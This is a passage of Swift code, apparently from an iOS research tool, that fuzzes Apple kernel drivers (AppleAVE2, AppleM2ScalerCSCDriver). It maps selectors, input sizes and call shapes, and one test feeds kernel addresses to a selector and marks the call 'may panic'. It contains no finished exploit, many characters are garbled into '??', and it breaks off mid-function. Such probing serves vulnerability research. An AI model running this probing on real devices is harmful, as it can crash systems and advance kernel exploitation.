    /// reports whether the order matters.
    func bench13AVE_Order() {
        benchLine("??? 13 ?? AppleAVE2 property order")
        benchLine("     setting a private key before EncoderUsage locks the session")

        func makeSession() -> VTCompressionSession? {
            var session: VTCompressionSession?
            let spec: [String: Any] = ["EnableHardwareAcceleratedVideoEncoder": true]
            let st = VTCompressionSessionCreate(
                allocator: kCFAllocatorDefault, width: 640, height: 360,
                codecType: kCMVideoCodecType_HEVC,
                encoderSpecification: spec as CFDictionary,
                imageBufferAttributes: nil, compressedDataAllocator: nil,
                outputCallback: nil, refcon: nil, compressionSessionOut: &session)
            return st == 0 ? session : nil
        }

        let keys: [(String, CFTypeRef)] = [
            ("SVENum", Int32(1) as CFTypeRef),
            ("SVESchedMode", Int32(1) as CFTypeRef),
            ("UseMultiPassSearch", Int32(1) as CFTypeRef),
            ("DPBNumberOfFrames", Int32(16) as CFTypeRef),
            ("UserDPBFramesForFaceTime", Int32(16) as CFTypeRef),
            ("EnableMultiPassEncoding", Int32(1) as CFTypeRef),
        ]

        var held: [VTCompressionSession] = []
        for (key, value) in keys {
            guard let s = makeSession() else { benchLine("     \(key) ?? no session"); continue }
            held.append(s)
            let first = VTSessionSetProperty(s, key: key as CFString, value: value)
            var line = "     \(key): before usage=\(first == 0 ? "ok" : String(first))"
            if first == 0 {
                let usage = VTSessionSetProperty(s, key: "EncoderUsage" as CFString, value: Int32(0) as CFTypeRef)
                let prep = VTCompressionSessionPrepareToEncodeFrames(s)
                line += " ?? usage=\(usage == 0 ? "ok" : String(usage)) ?? prepare=\(prep)"
            }
            benchLine(line)
        }

        benchLine("     keys that accept before usage are candidates for the SVE path")
        benchLine("??? done")
        Thread.sleep(forTimeInterval: 0.5)
        _ = held.count
    }

    // MARK: - test 14: scaler reachability

    /// Enumerates the scaler services and maps which user-client types open and
    /// which selectors answer. This surface has not been touched before.
    func bench14Scaler() {
        benchLine("??? 14 ?? scaler reachability")
        benchLine("     AppleM2ScalerCSCDriver ?? not examined before")

        let candidates = ["AppleM2ScalerCSCDriver", "ASEScaler", "AppleM2ScalerCSCHal"]
        var found = 0, opened = 0

        for cls in candidates {
            guard let m = cls.withCString({ xq_IOServiceMatching($0) }) else { continue }
            var it: io_iterator_t = 0
            guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { continue }
            var svc = xq_IOIteratorNext(it)
            if svc != 0 { found += 1 }
            xq_IOObjectRelease(it)

            while svc != 0 {
                benchLine("     \(cls) ?? service \(svc)")
                for type in UInt32(0)...3 {
                    var conn: io_connect_t = 0
                    let kr = xq_IOServiceOpen(svc, mach_task_self_, type, &conn)
                    let label = kr == 0 ? "opened"
                        : (kr == -536870206 ? "kIOReturnUnsupported (0xE00002C2)"
                        : (kr == -536870199 ? "kIOReturnNotPermitted (0xE00002E2)"
                        : "error \(kr)"))
                    benchLine("          open(type \(type)) ?? \(label)")
                    guard kr == 0 else { continue }
                    opened += 1

                    // Map the selector space with a zeroed input buffer.
                    for sel in UInt32(0)...8 {
                        var input = [UInt8](repeating: 0, count: 0x40)
                        var out = [UInt8](repeating: 0, count: 0x100)
                        var osz = 0x100
                        var outScalars = [UInt64](repeating: 0, count: 8)
                        var scount: UInt32 = 8
                        let skr: kern_return_t = input.withUnsafeBytes { ib in
                            out.withUnsafeMutableBytes { ob in
                                xq_IOConnectCallMethod(conn, sel, nil, 0,
                                                       ib.baseAddress, 0x40,
                                                       &outScalars, &scount,
                                                       ob.baseAddress, &osz)
                            }
                        }
                        if skr != -536870206 && skr != -536870201 {
                            benchLine("          sel \(sel) ?? kr=\(skr) outSize=\(osz)")
                        }
                    }
                    xq_IOServiceClose(conn)
                }
                var next = xq_IOIteratorNext(it)
                _ = next
                svc = 0
            }
        }

        benchLine(found > 0 ? "[OK] \(found) scaler service(s) visible" : "[NO] no scaler service matched")
        benchLine(opened > 0 ? "[OK] \(opened) user client(s) opened" : "[NO] no user client opened")
        benchLine("??? done")
    }

    // MARK: - test 15: scaler selector and size sweep

    /// The scaler user client opens for types 0..3 without entitlements. Every
    /// selector answered kIOReturnBadArgument, which means the method exists but
    /// the input shape was wrong. This sweep finds the size each one expects.
    func bench15ScalerSelectors() {
        benchLine("??? 15 ?? scaler selector sweep")
        benchLine("     every selector answered BadArgument at 0x40 bytes ?? looking for the right size")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] service not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else {
            benchLine("[NO] lookup failed"); return
        }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870207: return "Unsupported"
            case -536870201: return "Unsupported(0x2C7)"
            case -536870199: return "NotPermitted"
            default: return "kr=\(kr)"
            }
        }

        let sizes = [0, 8, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200]

        for type in UInt32(0)...3 {
            var conn: io_connect_t = 0
            guard xq_IOServiceOpen(svc, mach_task_self_, type, &conn) == KERN_SUCCESS else { continue }
            benchLine("     type \(type)")
            for sel in UInt32(0)...15 {
                var line = "          sel \(sel):"
                var interesting = false
                for size in sizes {
                    var input = [UInt8](repeating: 0, count: max(size, 1))
                    var out = [UInt8](repeating: 0, count: 0x200)
                    var osz = 0x200
                    var outScalars = [UInt64](repeating: 0, count: 8)
                    var scount: UInt32 = 8
                    let kr: kern_return_t = input.withUnsafeBytes { ib in
                        out.withUnsafeMutableBytes { ob in
                            xq_IOConnectCallMethod(conn, sel, nil, 0,
                                                   size == 0 ? nil : ib.baseAddress, size,
                                                   &outScalars, &scount,
                                                   ob.baseAddress, &osz)
                        }
                    }
                    line += " \(size)=\(name(kr))"
                    if kr != -536870206 { interesting = true }
                }
                // Only print selectors that are not uniformly BadArgument.
                if interesting { benchLine(line) }
            }
            xq_IOServiceClose(conn)
        }

        benchLine("     a selector that answers anything other than BadArgument accepts that size")
        benchLine("??? done")
    }

    // MARK: - test 16: exact input size per scaler selector

    /// Selectors 0..10 answer BadArgument for every coarse size tried so far.
    /// This sweep walks every 8 bytes up to 0x400 and reports the first size
    /// that stops being BadArgument, which is the expected structure size.
    func bench16ScalerExactSizes() {
        benchLine("??? 16 ?? scaler exact sizes")
        benchLine("     sel 0..10 want an exact structure ?? sweeping 0..0x400 in steps of 8")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] service not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else {
            benchLine("[NO] lookup failed"); return
        }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870207: return "Unsupported"
            case -536870201: return "Unsupported(0x2C7)"
            case -536870199: return "NotPermitted"
            default: return "kr=\(kr)"
            }
        }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else {
            benchLine("[NO] open failed"); return
        }
        defer { xq_IOServiceClose(conn) }

        // One scalar as an input word: some methods read their size from it.
        for sel in UInt32(0)...10 {
            var hits: [String] = []
            var firstOK: Int?
            for size in stride(from: 0, through: 0x400, by: 8) {
                for scalarsIn in [0, 1] {
                    var input = [UInt8](repeating: 0, count: max(size, 1))
                    var scalars = [UInt64](repeating: 0, count: 1)
                    var out = [UInt8](repeating: 0, count: 0x200)
                    var osz = 0x200
                    var outScalars = [UInt64](repeating: 0, count: 8)
                    var scount: UInt32 = 8
                    let kr: kern_return_t = input.withUnsafeBytes { ib in
                        out.withUnsafeMutableBytes { ob in
                            scalars.withUnsafeBufferPointer { sb in
                                xq_IOConnectCallMethod(conn, sel,
                                                       scalarsIn == 0 ? nil : sb.baseAddress, UInt32(scalarsIn),
                                                       size == 0 ? nil : ib.baseAddress, size,
                                                       &outScalars, &scount,
                                                       ob.baseAddress, &osz)
                            }
                        }
                    }
                    if kr != -536870206 {
                        hits.append("size=\(size) scal=\(scalarsIn) -> \(name(kr)) out=\(osz)")
                        if firstOK == nil { firstOK = size }
                    }
                }
                if hits.count >= 4 { break }
            }
            if hits.isEmpty {
                benchLine("     sel \(sel): BadArgument for every size up to 0x400")
            } else {
                benchLine("     sel \(sel):")
                for h in hits.prefix(4) { benchLine("          \(h)") }
            }
        }

        benchLine("     a size that stops being BadArgument is the expected structure size")
        benchLine("??? done")
    }

    // MARK: - test 17: scalars vs structure

    /// Selectors 0..10 return BadArgument for every structure size. This test
    /// checks the other calling convention: scalar inputs only, and scalars
    /// combined with a structure.
    func bench17ScalerScalars() {
        benchLine("??? 17 ?? scaler scalars")
        benchLine("     BadArgument for every struct size ?? maybe the methods take scalars")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] service not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else {
            benchLine("[NO] lookup failed"); return
        }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870207: return "Unsupported"
            case -536870201: return "Unsupported(0x2C7)"
            case -536870199: return "NotPermitted"
            default: return "kr=\(kr)"
            }
        }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else {
            benchLine("[NO] open failed"); return
        }
        defer { xq_IOServiceClose(conn) }

        for sel in UInt32(0)...11 {
            var parts: [String] = []
            // scalar-only, 1..4 words; the first word carries the selector value 1
            for sc in 1...4 {
                var scalars = [UInt64](repeating: 0, count: sc)
                scalars[0] = 1
                var outScalars = [UInt64](repeating: 0, count: 8)
                var scount: UInt32 = 8
                let kr = xq_IOConnectCallScalarMethod(conn, sel, &scalars, UInt32(sc), &outScalars, &scount)
                parts.append("sc\(sc)=\(name(kr))")
            }
            // scalars plus an empty structure
            for sc in 1...2 {
                var scalars = [UInt64](repeating: 0, count: sc)
                scalars[0] = 1
                var outScalars = [UInt64](repeating: 0, count: 8)
                var scount: UInt32 = 8
                var input = [UInt8](repeating: 0, count: 0x20)
                var out = [UInt8](repeating: 0, count: 0x100)
                var osz = 0x100
                let kr: kern_return_t = input.withUnsafeBytes { ib in
                    out.withUnsafeMutableBytes { ob in
                        xq_IOConnectCallMethod(conn, sel, &scalars, UInt32(sc),
                                               ib.baseAddress, 0x20,
                                               &outScalars, &scount,
                                               ob.baseAddress, &osz)
                    }
                }
                parts.append("sc\(sc)+0x20=\(name(kr))")
            }
            benchLine("     sel \(sel): \(parts.joined(separator: " "))")
        }

        benchLine("     a selector that answers ok here takes scalars, not a structure")
        benchLine("??? done")
    }

    // MARK: - test 18: combined scalar count and structure size

    /// The methods reject struct-only and scalar-only calls differently, so they
    /// want both. This grid walks scalar counts 0..4 against structure sizes up
    /// to 0x1000 and prints only the cells that are not BadArgument.
    func bench18ScalerGrid() {
        benchLine("??? 18 ?? scaler grid")
        benchLine("     scalars ?? structure size ?? printing only non-BadArgument cells")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] service not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else {
            benchLine("[NO] lookup failed"); return
        }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870207: return "Unsupported"
            case -536870201: return "Unsupported(0x2C7)"
            case -536870199: return "NotPermitted"
            default: return "kr=\(kr)"
            }
        }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else {
            benchLine("[NO] open failed"); return
        }
        defer { xq_IOServiceClose(conn) }

        let sizes = [0, 0x10, 0x18, 0x20, 0x28, 0x30, 0x40, 0x60, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000]

        for sel in UInt32(0)...11 {
            var hits: [String] = []
            for sc in 0...4 {
                for size in sizes {
                    var scalars = [UInt64](repeating: 0, count: max(sc, 1))
                    scalars[0] = 1
                    var outScalars = [UInt64](repeating: 0, count: 8)
                    var scount: UInt32 = 8
                    var input = [UInt8](repeating: 0, count: max(size, 1))
                    var out = [UInt8](repeating: 0, count: 0x200)
                    var osz = 0x200
                    let kr: kern_return_t = input.withUnsafeBytes { ib in
                        out.withUnsafeMutableBytes { ob in
                            xq_IOConnectCallMethod(conn, sel,
                                                   sc == 0 ? nil : scalars, UInt32(sc),
                                                   size == 0 ? nil : ib.baseAddress, size,
                                                   &outScalars, &scount,
                                                   ob.baseAddress, &osz)
                        }
                    }
                    if kr != -536870206 {
                        hits.append("sc\(sc)/0x\(String(size, radix: 16))=\(name(kr))")
                    }
                }
            }
            if hits.isEmpty {
                benchLine("     sel \(sel): BadArgument everywhere")
            } else {
                benchLine("     sel \(sel): \(hits.prefix(8).joined(separator: " "))")
            }
        }

        benchLine("??? done")
    }

    // MARK: - test 19: full selector map

    /// Only 0..15 have been probed. This walks 0..64 with a fixed structure and
    /// reports every selector that is not BadArgument, so the real dispatch
    /// table is visible even if the methods live above 15.
    func bench19ScalerSelectorMap() {
        benchLine("??? 19 ?? scaler selector map")
        benchLine("     walking selectors 0..64 ?? one scalar and a 0x40 structure")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] service not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else {
            benchLine("[NO] lookup failed"); return
        }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870207: return "Unsupported"
            case -536870201: return "Unsupported(0x2C7)"
            case -536870199: return "NotPermitted"
            default: return "kr=\(kr)"
            }
        }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else {
            benchLine("[NO] open failed"); return
        }
        defer { xq_IOServiceClose(conn) }

        var uniq: [String: Int] = [:]
        for sel in UInt32(0)...64 {
            var scalars: [UInt64] = [1]
            var outScalars = [UInt64](repeating: 0, count: 8)
            var scount: UInt32 = 8
            var input = [UInt8](repeating: 0, count: 0x40)
            var out = [UInt8](repeating: 0, count: 0x200)
            var osz = 0x200
            let kr: kern_return_t = input.withUnsafeBytes { ib in
                out.withUnsafeMutableBytes { ob in
                    xq_IOConnectCallMethod(conn, sel, &scalars, 1,
                                           ib.baseAddress, 0x40,
                                           &outScalars, &scount,
                                           ob.baseAddress, &osz)
                }
            }
            uniq[name(kr), default: 0] += 1
            if kr != -536870206 && kr != -536870207 && kr != -536870201 {
                benchLine("     sel \(sel): \(name(kr)) out=\(osz)")
            }
        }
        let summary = uniq.map { "\($0.key)=\($0.value)" }.sorted().joined(separator: " ")
        benchLine("     summary: \(summary)")
        benchLine("??? done")
    }

    // MARK: - test 20: matching output sizes

    /// The dispatcher validates output sizes as well as input sizes, which is why
    /// every input-only probe returned BadArgument. This walks input size, scalar
    /// count and output shape together, including the two shapes named by the
    /// public scaler report: 0x1b0 for selector 1 and 0x18 for selector 10.
    func bench20ScalerShapes() {
        benchLine("??? 20 ?? scaler call shapes")
        benchLine("     input size ?? scalars ?? output shape ?? looking for the accepted combination")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] service not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else {
            benchLine("[NO] lookup failed"); return
        }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870207: return "Unsupported"
            case -536870201: return "Unsupported(0x2C7)"
            case -536870199: return "NotPermitted"
            case -536870160: return "0xE00002F0"
            default: return "kr=\(kr)"
            }
        }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else {
            benchLine("[NO] open failed"); return
        }
        defer { xq_IOServiceClose(conn) }

        let inputSizes = [0x18, 0x1b0, 0x10, 0x20, 0x40, 0x100, 0x180, 0x2380]
        let outShapes: [(Int, UInt32)] = [(0, 0), (0, 1), (0x40, 0), (0x40, 1), (0x100, 0)]

        for sel in [UInt32(1), 10, 0, 11] {
            var hits: [String] = []
            for size in inputSizes {
                for sc in 0...4 {
                    for (outSize, outScalars) in outShapes {
                        var scalars = [UInt64](repeating: 0, count: max(sc, 1))
                        scalars[0] = 1
                        var inScalars = scalars
                        var outScalarBuf = [UInt64](repeating: 0, count: max(Int(outScalars), 1))
                        var outScalarCnt = outScalars
                        var input = [UInt8](repeating: 0, count: max(size, 1))
                        var out = [UInt8](repeating: 0, count: max(outSize, 1))
                        var osz = outSize
                        var kr: kern_return_t = -1
                        input.withUnsafeBytes { ib in
                            out.withUnsafeMutableBytes { ob in
                                inScalars.withUnsafeBufferPointer { sb in
                                    outScalarBuf.withUnsafeMutableBufferPointer { osc in
                                        kr = xq_IOConnectCallMethod(conn, sel,
                                                                    sc == 0 ? nil : sb.baseAddress, UInt32(sc),
                                                                    ib.baseAddress, size,
                                                                    outScalars == 0 ? nil : osc.baseAddress, &outScalarCnt,
                                                                    outSize == 0 ? nil : ob.baseAddress, &osz)
                                    }
                                }
                            }
                        }
                        if kr != -536870206 {
                            hits.append("in0x\(String(size, radix: 16))/sc\(sc)/out0x\(String(outSize, radix: 16))/osc\(outScalars)=\(name(kr))")
                        }
                    }
                }
            }
            if hits.isEmpty {
                benchLine("     sel \(sel): BadArgument for every shape")
            } else {
                benchLine("     sel \(sel): \(hits.count) shape(s) passed the size check")
                for h in hits.prefix(10) { benchLine("          \(h)") }
            }
        }

        benchLine("??? done")
    }

    // MARK: - test 21: full ABI map

    /// With the output shape known to be empty, the input sizes can finally be
    /// mapped for every selector. Walks 0..0x2400 in steps of 8 with no output
    /// structure and reports the sizes that pass the dispatcher.
    func bench21ScalerABI() {
        benchLine("??? 21 ?? scaler ABI map")
        benchLine("     no output structure ?? sizes 0..0x2400 step 8 ?? sel 0..11")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] service not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else {
            benchLine("[NO] lookup failed"); return
        }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870207: return "Unsupported"
            case -536870201: return "Unsupported(0x2C7)"
            case -536870199: return "NotPermitted"
            case -536870160: return "NotReady(0x2F0)"
            default: return "kr=\(kr)"
            }
        }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else {
            benchLine("[NO] open failed"); return
        }
        defer { xq_IOServiceClose(conn) }

        for sel in UInt32(0)...11 {
            var passing: [(Int, String)] = []
            for size in stride(from: 0, through: 0x2400, by: 8) {
                var input = [UInt8](repeating: 0, count: max(size, 1))
                var osz = 0
                var kr: kern_return_t = -1
                input.withUnsafeBytes { ib in
                    kr = xq_IOConnectCallMethod(conn, sel,
                                                nil, 0,
                                                size == 0 ? nil : ib.baseAddress, size,
                                                nil, nil,
                                                nil, &osz)
                }
                if kr != -536870206 {
                    passing.append((size, name(kr)))
                }
            }
            if passing.isEmpty {
                benchLine("     sel \(sel): no size accepted")
            } else {
                let sizes = passing.map { "0x\(String($0.0, radix: 16))=\($0.1)" }
                benchLine("     sel \(sel): \(passing.count) size(s) ??? \(sizes.prefix(8).joined(separator: " "))")
            }
        }

        benchLine("??? done")
    }

    // MARK: - test 22: per-type selector behaviour

    /// Type 0 was assumed to be the working client. The other three open too, so
    /// this repeats the known shapes on each type and reports where the answer
    /// changes ??? a session client would not answer NotReady.
    func bench22ScalerTypes() {
        benchLine("??? 22 ?? scaler client types")
        benchLine("     same selectors on types 0..3 ?? looking for a type that is ready")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] service not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else {
            benchLine("[NO] lookup failed"); return
        }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case 1: return "KERN_INVALID_ADDRESS"
            case -536870206: return "BadArgument"
            case -536870207: return "Unsupported"
            case -536870201: return "Unsupported(0x2C7)"
            case -536870209: return "IPCError"
            case -536870211: return "NoMemory"
            case -536870174: return "NotPermitted"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        let selectors: [UInt32] = [1, 6, 7, 9, 10, 11]
        let sizes = [0x8, 0x10, 0x18, 0x1b0, 0xfa8]

        for type in UInt32(0)...3 {
            var conn: io_connect_t = 0
            guard xq_IOServiceOpen(svc, mach_task_self_, type, &conn) == KERN_SUCCESS else {
                benchLine("     type \(type): open failed"); continue
            }
            benchLine("     type \(type)")
            for sel in selectors {
                var parts: [String] = []
                for size in sizes {
                    var input = [UInt8](repeating: 0, count: size)
                    var osz = 0
                    var kr: kern_return_t = -1
                    input.withUnsafeBytes { ib in
                        kr = xq_IOConnectCallMethod(conn, sel, nil, 0, ib.baseAddress, size,
                                                    nil, nil, nil, &osz)
                    }
                    parts.append("0x\(String(size, radix: 16))=\(name(kr))")
                }
                benchLine("          sel \(sel): \(parts.joined(separator: " "))")
            }
            xq_IOServiceClose(conn)
        }

        benchLine("??? done")
    }

    // MARK: - test 23: bring the client into a ready state

    /// sel 9 takes 0x10 bytes and answers NoMemory with zeros, which looks like an
    /// allocation that needs a real size. sel 1 takes 0x1b0 and answers NotReady.
    /// This tries plausible values for sel 9 and then re-tests sel 1, looking for
    /// a state where the async path stops saying NotReady.
    func bench23ScalerSetup() {
        benchLine("??? 23 ?? scaler setup")
        benchLine("     sel 9 may create the context that sel 1 needs")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] service not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else {
            benchLine("[NO] lookup failed"); return
        }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case 1: return "KERN_INVALID_ADDRESS"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported(0x2C7)"
            case -536870209: return "IPCError"
            case -536870211: return "NoMemory"
            case -536870174: return "NotPermitted"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        func call(_ conn: io_connect_t, _ sel: UInt32, _ bytes: [UInt8]) -> (kern_return_t, Int) {
            var input = bytes.isEmpty ? [UInt8](repeating: 0, count: 1) : bytes
            var osz = 0
            var outScalars = [UInt64](repeating: 0, count: 8)
            var scount: UInt32 = 8
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                outScalars.withUnsafeMutableBufferPointer { sop in
                    kr = xq_IOConnectCallMethod(conn, sel, nil, 0,
                                                bytes.isEmpty ? nil : ib.baseAddress, bytes.count,
                                                sop.baseAddress, &scount,
                                                nil, &osz)
                }
            }
            return (kr, Int(outScalars[0]))
        }

        // Patterns for the 0x10 byte structure of sel 9.
        var patterns: [(String, [UInt8])] = []
        func pattern(_ label: String, _ u32: [UInt32]) {
            var b: [UInt8] = []
            for v in u32 { b.append(contentsOf: withUnsafeBytes(of: v.littleEndian, Array.init)) }
            while b.count < 0x10 { b.append(0) }
            patterns.append((label, b))
        }
        pattern("zeros", [0, 0, 0, 0])
        pattern("1,0,0,0", [1, 0, 0, 0])
        pattern("0,1,0,0", [0, 1, 0, 0])
        pattern("0x1000,0,0,0", [0x1000, 0, 0, 0])
        pattern("1,1,0,0", [1, 1, 0, 0])
        pattern("1,0x1000,0,0", [1, 0x1000, 0, 0])
        pattern("0x1000,1,0,0", [0x1000, 1, 0, 0])
        pattern("0x40,0x40,0x40,0x40", [0x40, 0x40, 0x40, 0x40])
        pattern("0xffffffff x4", [0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff])
        patterns.append(("all 0xff bytes", [UInt8](repeating: 0xff, count: 0x10)))

        for (label, bytes) in patterns {
            var conn: io_connect_t = 0
            guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else {
                benchLine("     \(label): open failed"); continue
            }
            let (r9, v9) = call(conn, 9, bytes)
            // sel 1 with a zeroed 0x1b0 shape, to see whether the state changed
            let (r1, _) = call(conn, 1, [UInt8](repeating: 0, count: 0x1b0))
            benchLine("     \(label): sel9=\(name(r9)) out=\(v9) ?? sel1=\(name(r1))")
            xq_IOServiceClose(conn)
        }

        benchLine("     sel 1 leaving NotReady is the signal that the context exists")
        benchLine("??? done")
    }

    // MARK: - test 24: selector 7 address handling

    /// sel 7 takes an 8 byte structure and answered KERN_INVALID_ADDRESS for zero,
    /// which means it treats the value as an address. This walks several address
    /// classes and reports whether the answer depends on the value ??? a strict
    /// validator versus a range check.
    func bench24ScalerAddr() {
        benchLine("??? 24 ?? scaler pointer handling")
        benchLine("     sel 7 ?? 8 bytes treated as an address")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
            benchLine("[NO] service not found"); return
        }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else {
            benchLine("[NO] lookup failed"); return
        }
        let svc = xq_IOIteratorNext(it)
        xq_IOObjectRelease(it)
        guard svc != 0 else { benchLine("[NO] no service"); return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case 1: return "KERN_INVALID_ADDRESS"
            case 2: return "KERN_PROTECTION_FAILURE"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported(0x2C7)"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        // A user allocation we can name, used only for the last case.
        let scratch = UnsafeMutableRawPointer.allocate(byteCount: 0x1000, alignment: 16)
        defer { scratch.deallocate() }
        memset(scratch, 0, 0x1000)

        let cases: [(String, UInt64, Bool)] = [
            ("zero", 0, false),
            ("one", 1, false),
            ("0x1000", 0x1000, false),
            ("0x1_0000_0000", 0x1_0000_0000, false),
            ("kernel high half", 0xffff_0000_0000_0000, false),
            ("kernel text base", 0xffff_fff0_0700_4000, false),
            ("kernel map start", 0xffff_ff80_0000_0000, false),
            ("user scratch", UInt64(UInt(bitPattern: scratch)), true),
        ]

        func probe(_ value: UInt64) -> (kern_return_t, UInt64) {
            var bytes = withUnsafeBytes(of: value.littleEndian, Array.init)
            while bytes.count < 8 { bytes.append(0) }
            var conn: io_connect_t = 0
            guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return (-536870207, 0) }
            defer { xq_IOServiceClose(conn) }
            var outScalars = [UInt64](repeating: 0, count: 8)
            var scount: UInt32 = 8
            var osz = 0
            var kr: kern_return_t = -1
            bytes.withUnsafeBytes { ib in
                outScalars.withUnsafeMutableBufferPointer { sop in
                    kr = xq_IOConnectCallMethod(conn, 7, nil, 0, ib.baseAddress, 8,
                                                sop.baseAddress, &scount, nil, &osz)
                }
            }
            return (kr, outScalars[0])
        }

        for (label, value, risky) in cases {
            let (kr, out) = probe(value)
            let mark = risky ? "  ??? may panic" : ""
            benchLine("     \(label) 0x\(String(value, radix: 16)): \(name(kr)) out=0x\(String(out, radix: 16))\(mark)")
        }

        benchLine("     if every class answers the same, the value is validated, not dereferenced")
        benchLine("??? done")
    }

    // MARK: - test 25: marker influence

    /// sel 10 accepts 0x18 bytes and answers ok, so it stores something we control.
    /// This writes several markers and re-tests the neighbouring selectors to see
    /// whether the marker changes readiness, allocation or the getter output.
    func bench25ScalerMarker() {
        benchLine("??? 25 ?? scaler marker influence")
        benchLine("     write via sel 10, then re-test sel 1, 9 and 11")

        guard let m = "AppleM2ScalerCSCDriver".withCString({ xq_IOServiceMatching($0) }) else {
